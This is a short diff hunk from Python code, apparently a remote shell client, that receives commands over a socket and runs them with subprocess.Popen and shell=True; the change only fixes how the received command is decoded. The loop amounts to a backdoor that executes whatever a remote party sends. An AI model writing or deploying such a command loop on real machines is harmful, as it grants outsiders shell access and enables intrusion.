@@ -50,10 +50,9 @@ while not login_status:
 while True:
     try:
         print('Awaiting Command')
-        command = client.recv(1024)
-        command.decode()
+        command = client.recv(1024).decode()
 
-        if command == b'exit':
+        if command == 'exit':
             continue
 
         op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
